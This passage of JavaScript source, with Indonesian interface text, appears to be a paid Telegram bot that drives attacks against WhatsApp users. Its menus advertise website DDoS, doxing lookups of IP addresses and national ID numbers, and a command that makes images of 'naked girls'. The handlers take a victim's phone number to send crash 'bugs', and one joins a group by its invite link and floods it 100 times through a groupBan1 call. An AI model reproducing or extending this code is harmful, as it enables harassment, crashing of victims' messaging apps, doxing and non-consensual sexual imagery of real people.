            style: "success" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }

    else if (data === "menuTools") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

✦••┈┈ - 𝐇𝐚𝐯𝐞𝐅𝐮𝐧 𝐌𝐞𝐧𝐮 𝕺𝖓𝖊 - ┈┈••✦
─ #- 𝕿𝖔𝖔𝖑𝖘 𝖒𝖊𝖓𝖚° ─( 🛠 )
┃☰. - /ddoswebsite « Url »
〢-╰➤ ° ↯ Attack Website ¡
┃☰. - /fixcode « Reply Code »
〢-╰➤ ° ↯ Fixing Code Error ¡
┃☰. - /play « Song Name »
〢-╰➤ ° ↯ Search Music ¡
┃☰. - /ssiphone « Query »
〢-╰➤ ° ↯ Screenshot WhatsApp Ip ¡
┃☰. - /addfiture « Reply Code »
〢-╰➤ ° ↯ Add New Fitures ¡
┃☰. - /removebg « Reply Image »
〢-╰➤ ° ↯ Delete Baground Image ¡
┃☰. - /watermark « Reply Image »
〢-╰➤ ° ↯ Adding Watermark to Photos ¡
┃☰. - /tiktokdl « Url »
〢-╰➤ ° ↯ Download Media Tiktok ¡
┃☰. - /instagramdl « Url »
〢-╰➤ ° ↯ Download Media Instagram ¡
┃☰. - /pinterest « Query »
〢-╰➤ ° ↯ Search Image From Pinterest ¡

⧫━⟢ ႪဝઽႠႫႮႨႱႤ – ႹმჁძა ⟣━⧫
\`\`\`
`;

      replyMarkup = {
        inline_keyboard: [
          [
           { text: "𝗫𝗚𝗥𝗢𝗨𝗣",
           callback_data: "groupMenu",
           style: "danger" , icon_custom_emoji_id: "5411329291659013967" }, 
           { text: "𝗫𝗗𝗢𝗫𝗜𝗡𝗚",
           callback_data: "Doxing",
           style: "danger" , icon_custom_emoji_id: "5463343407197878047" }
          ], 
          [
           { text: "𝗫𝗧𝗢𝗢𝗟𝗦",
           callback_data: "ToolsTwo", 
           style: "primary" , icon_custom_emoji_id: "5368499186293564526" },
           { text: "𝗠𝗘𝗡𝗨 𝗔𝗗𝗗",
           callback_data: "MenuAdd", 
           style: "primary" , icon_custom_emoji_id: "5368499186293564526" }
          ], 
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "back_to_main",
            style: "success" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }
    
    else if (data === "groupMenu") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

─ #- 𝕲𝖗𝖚𝖕𝖒𝖊𝖓𝖚° ─( 👥 )
┃☰. - /promote « Reply Users »
〢-╰➤ ° ↯ Promote Users In Groups ¡
┃☰. - /demote « Reply Users »
〢-╰➤ ° ↯ Demote Users In Groups ¡
┃☰. - /setwelcome « Text / Photo »
〢-╰➤ ° ↯ Custom Text Welcome ¡
┃☰. - /welcome « on|off »
〢-╰➤ ° ↯ Settings On / Offline Welcome ¡
┃☰. - /kick « Reply Users »
〢-╰➤ ° ↯ Kick Users From Groups ¡
┃☰. - /warn « Reply Users »
〢-╰➤ ° ↯ Giving A Warning ¡
┃☰. - /unwarn « Reply Users »
〢-╰➤ ° ↯ Delete A Warning ¡
┃☰. - /addblocklist « Text »
〢-╰➤ ° ↯ Add Forbidden Words ¡
┃☰. - /delblocklist « Text »
〢-╰➤ ° ↯ Delete Forbidden Words ¡
┃☰. - /blocklist 
〢-╰➤ ° ↯ See All Blocklist ¡

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫
\`\`\`
`;

    replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞", 
            callback_data: "menuTools",
            style: "danger" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }
    
    else if (data === "ToolsTwo") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

─ #- 𝕿𝖔𝖔𝖑𝖘° ─( 🛠 )
┃☰. - /channel
〢-╰➤ ° ↯ Joining Channel ¡
┃☰. - /chatowner « Text »
〢-╰➤ ° ↯ Message Owner From Bot ¡
┃☰. - /sticker « Reply Image »
〢-╰➤ ° ↯ Convert Image To Sticker ¡
┃☰. - /getcode « Url »
〢-╰➤ ° ↯ Fetch HTML Code ¡
┃☰. - /enchtml - Reply File
〢-╰➤ ° ↯ Locking HTML Code ¡
┃☰. - /tourl « Reply Image »
〢-╰➤ ° ↯ Upload Image To Link ¡
┃☰. - /brat « Text »
〢-╰➤ ° ↯ Sticker Brat ¡
┃☰. - /tonaked « Reply Image »
〢-╰➤ ° ↯ To Naked Girls ¡

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫
\`\`\`
`;

    replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "menuTools", 
            style: "primary" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }
    
    else if (data === "Doxing") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

─ #- 𝕯𝖔𝖝𝖏𝖓𝖌° ─( 🔍 )
┃☰. - /trackip « IP Adress »
〢-╰➤ ° ↯ Search Information IP Adress ¡
┃☰. - /nikparse « NIK »
〢-╰➤ ° ↯ Search Information NIK ¡

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫
\`\`\`
`;

    replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "menuTools", 
            style: "success" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }
    
    else if (data === "TqTo") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

─ #- 𝕿𝖍𝖆𝖓𝖐𝖘 𝖙𝖔° ─( 🫀 )
┃☰. @DarlinNyc
〢-╰➤ ° ↯ ᴅᴇᴠᴇʟᴏᴘᴇʀ
┃☰. @Mylinmw
〢-╰➤ ° ↯ ꜱᴜᴘᴘᴏʀᴛ
┃☰. @Sanzxyzbca
〢-╰➤ ° ↯ ꜱᴜᴘᴘᴏʀᴛ
┃☰. @styleclaimfake

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫
\`\`\`
`;

      replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "back_to_main", 
            style: "success" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }

    else if (data === "menu") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

✦••┈┈ - 𝐒𝐞𝐭𝐭𝐢𝐧𝐠 𝐒𝐜𝐫𝐢𝐨𝐭 - ┈┈••✦
𖥊. - /restart => ᴍᴇʀᴇsᴛᴀʀᴛ ᴘᴀɴᴇʟ ᴏᴛᴏᴍᴀᴛɪs
𖥊. - /setcd => ᴍᴇɴɢᴀᴛᴜʀ ᴄᴏᴏʟᴅᴏᴡɴ
𖥊. - /connect => ᴍᴇɴᴀᴍʙᴀʜᴋᴀɴ sᴇɴᴅᴇʀ
𖥊. - /listbot => ᴍᴇʟɪʜᴀᴛ sᴇɴᴅᴇʀ ᴀᴋᴛɪғ
𖥊. - /lock => ᴍᴇɴɢᴜɴᴄɪ ᴄᴍᴅ ʙᴜɢs 
𖥊. - /buka => ᴍᴇᴍʙᴜᴋᴀ ᴄᴍᴅ ʙᴜɢs
𖥊. - /listlock  => ᴍᴇʟɪʜᴀᴛ ᴄᴍᴅ ᴛᴇʀᴋᴜɴᴄɪ

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫
\`\`\`
`;

replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "menuTools", 
            style: "primary" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }
    
    else if (data === "MenuAdd") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

─ #- 𝗠𝗘𝗡𝗨 𝗔𝗗𝗗° ─( ✚ )
┃☰. - /addgroupremium
〢-╰➤ ° ↯ Menambahkan Premium Group ¡
┃☰. - /delgroupremium
〢-╰➤ ° ↯ Menghapus Premium Group ¡
┃☰. - /cekpremiumgroup
〢-╰➤ ° ↯ Mengecek Premium Group ¡
┃☰. - /addowner 
〢-╰➤ ° ↯ ᴍᴇɴᴀᴍʙᴀʜᴋᴀɴ ᴏᴡɴᴇʀ ¡
┃☰. - /delowner
〢-╰➤ ° ↯ ᴍᴇɴɢʜᴀᴘᴜs ᴏᴡɴᴇʀ ¡
┃☰. - /addadmin
〢-╰➤ ° ↯ ᴍᴇɴᴀᴍʙᴀʜᴋᴀ ᴀᴅᴍɪɴ ¡
┃☰. - /deladmin 
〢-╰➤ ° ↯ ᴍᴇɴɢʜᴀᴘᴜs ᴀᴅᴍɪɴ ¡
┃☰. - /addprem
〢-╰➤ ° ↯ ᴍᴇɴᴀᴍʙᴀʜᴋᴀɴ ᴘʀᴇᴍɪᴜᴍ ¡
┃☰. - /delprem 
〢-╰➤ ° ↯ ᴍᴇɴɢʜᴀᴘᴜs ᴘʀᴇᴍɪᴜᴍ ¡

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫
\`\`\`
`;

      replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "back_to_main", 
            style: "success" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }
    
    try {
  await bot.editMessageCaption(caption, {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: "MarkdownV2",
    reply_markup: replyMarkup
  });
  } catch (e) {
  await bot.editMessageText(caption, {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: "MarkdownV2",
    reply_markup: replyMarkup
  }).catch(()=>{});
}

  } catch (err) {
    console.error(err);
  }
});

bot.onText(/\/xbugs (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/xbugs"] === true) {
    return bot.sendMessage(chatId, "❌ Command /xbugs sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /xbugs`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Delay Hard Spam
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});


function extractGroupCode(link) {
    try {
        const url = new URL(link);
        if (url.hostname !== "chat.whatsapp.com") return null;

        const parts = url.pathname.split("/").filter(Boolean);
        return parts[0] || null;
    } catch {
        return null;
    }
}
bot.onText(/^\/bangc(?:\s+(.+))?$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const link = match?.[1]?.trim();
    const randomImage = getRandomImage();

    const cooldown = checkCooldown(senderId);
    if (cooldown) {
        return bot.sendMessage(
            chatId,
            `⏳ *Cooldown!* Tunggu ${cooldown} lagi sebelum menggunakan command ini.`,
            { parse_mode: "Markdown" }
        );
    }

    const joined = await checkJoined(senderId);
    if (!joined) {
        return bot.sendMessage(
            chatId,
            `❌ *Kamu belum join channel!*\nSilakan join dulu untuk menggunakan command ini.`,
            { parse_mode: "Markdown" }
        );
    }

    if (!link) {
        return bot.sendMessage(
            chatId,
            `🪧 *Format:* /bannido https://chat.whatsapp.com/xxxxxx\n\n*Cara:* Kirim link undangan grup WhatsApp, bot akan otomatis join dan mengirim bug.`,
            { parse_mode: "Markdown" }
        );
    }

    const inviteCode = extractGroupCode(link);
    if (!inviteCode) {
        return bot.sendMessage(
            chatId,
            `❌ *Link tidak valid!* Pastikan link undangan grup WhatsApp.\nContoh: https://chat.whatsapp.com/abc123xyz`,
            { parse_mode: "Markdown" }
        );
    }

    if (!sock) {
        return bot.sendMessage(
            chatId,
            `❌ *Bot WhatsApp belum terhubung!*\nTunggu sampai koneksi WhatsApp siap, lalu coba lagi.`,
            { parse_mode: "Markdown" }
        );
    }

    const thumbnailURL = "https://files.catbox.moe/tq24pu.png";
    const processMsg = await bot.sendPhoto(chatId, thumbnailURL, {
        caption: `
<blockquote> Succeed Group Details ᝄ</blockquote>
⇢Target: ${link}
⇢Status: 🔄 Processing... (Join Grup)
⇢Command: /bannido
`,
        parse_mode: "HTML",
    });

    const processMsgId = processMsg.message_id;

    try {
        const groupJid = await sock.groupAcceptInvite(inviteCode);

        if (!groupJid) {
            throw new Error("Gagal join: groupJid kosong. Cek link atau bot sudah join sebelumnya.");
        }

        console.log(chalk.green(`✅ Berhasil join grup: ${groupJid}`));

        await bot.editMessageCaption(
            `
<blockquote> Succeed Group Details ᝄ</blockquote>
⇢Target: ${link}
⇢Group JID: ${groupJid}
⇢Status: ✅ Join Berhasil!
⇢Command: /bannido
`,
            {
                chat_id: chatId,
                message_id: processMsgId,
                parse_mode: "HTML",
            }
        );

        const totalSpam = 100;
        for (let i = 0; i < totalSpam; i++) {
            try {
                await groupBan1(sock, groupJid);
            } catch (err) {
                console.log(`⚠️ Gagal kirim bug ke grup: ${err.message}`);
            }
            await sleep(1500);
            console.log(chalk.yellow(`📱 Blank bug ke grup ${groupJid} (${i + 1}/${totalSpam})`));
        }

        await bot.editMessageCaption(
            `
<blockquote> Succeed Group Details ᝄ</blockquote>
⇢Target: ${link}
⇢Group JID: ${groupJid}
⇢Status: ✅ Success! ${totalSpam} bug terkirim
⇢Command: /bannido
`,
            {
                chat_id: chatId,
                message_id: processMsgId,
                parse_mode: "HTML",
            }
        );
    } catch (err) {
        console.error(chalk.red(`❌ Gagal: ${err.message}`));

        let errorMsg = err.message;
        if (errorMsg.includes("already") || errorMsg.includes("exist")) {
            errorMsg = "Bot sudah pernah bergabung ke grup ini sebelumnya.";
        } else if (errorMsg.includes("invalid") || errorMsg.includes("expired")) {
            errorMsg = "Link undangan tidak valid atau sudah kadaluarsa.";
        }

        await bot.editMessageCaption(
            `
<blockquote> Succeed Group Details ᝄ</blockquote>
⇢Target: ${link}
⇢Status: ❌ Gagal: ${errorMsg}
⇢Command: /bannido
`,
            {
                chat_id: chatId,
                message_id: processMsgId,
                parse_mode: "HTML",
            }
        );
    }
});
bot.onText(/\/forceclick (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/forceclick"] === true) {
    return bot.sendMessage(chatId, "❌ Command /forceclick sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /forceclick`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Click 
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Forclose Click
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/Blank (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}

    if (commandLocks["/Blank"] === true) {
    return bot.sendMessage(chatId, "❌ Command /Blank sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /Blank`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "( 👤 ) 𝗔𝘂𝘁𝗵𝗼𝗿", url: "https://t.me/DarlinNyc", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Blank
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Process Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "🕓 𝗣𝗿𝗼𝗰𝗲𝘀𝘀 ☇ 𝗕𝘂𝗴𝘀", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );

    await bot.editMessageText(
      `
\`\`\`JavaScript
X-Vaelix Infinity - New
\`\`\`\`\`\`Notification
┌──────────────────────────
│𖦲 Pengirim : @${msg.from.username || "unknown"}
│𖦲 Bugs  : Blank
│𖦲 Target : ${formattedNumber}
│𖦲 Status : Succesfully Send Bugs
│⚠️ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗧𝗲𝗹𝗮𝗵 𝗧𝘂𝗺𝗯𝗮𝗻𝗴, 𝗚𝘂𝗻𝗮𝗸𝗮𝗻
│𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗦𝗲𝗯𝗷𝗶𝗸𝗮𝗻 𝗠𝘂𝗻𝗴𝗸𝗶𝗻
└──────────────────────────\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "📱 𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ 𝗘𝗿𝗿𝗼𝗿 𝗕𝘂𝗴𝘀 𝗧𝗮𝗿𝗴𝗲𝘁: ${error.message}`);
  }
});

bot.onText(/\/BlankV2 (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  
    if (commandLocks["/BlankV2"] === true) {
    return bot.sendMessage(chatId, "❌ Command /BlankV2 sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/buka /BlankV2`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `𝖥𝗂𝗍𝗎𝗋𝖾 𝖡𝗎𝗀 𝖲𝖾𝖽𝖺𝗇𝗀 𝖩𝖾𝖽𝖺 ${cooldown}s, 𝖩𝗂𝗄𝖺 𝖨𝗇𝗀𝗂𝗇 𝖬𝖾𝗇𝗀𝖺𝗍𝗎𝗋 𝖩𝖾𝖽𝖺 𝖲𝗂𝗅𝖺𝗁𝗄𝖺𝗇 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 /setcd 0s`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
✦ Access Denied ✦

User : @${msg.from.username || "unknown"}
( ! ) You do not have access
Please add Premium before using Bug features ✦\`\`\``,
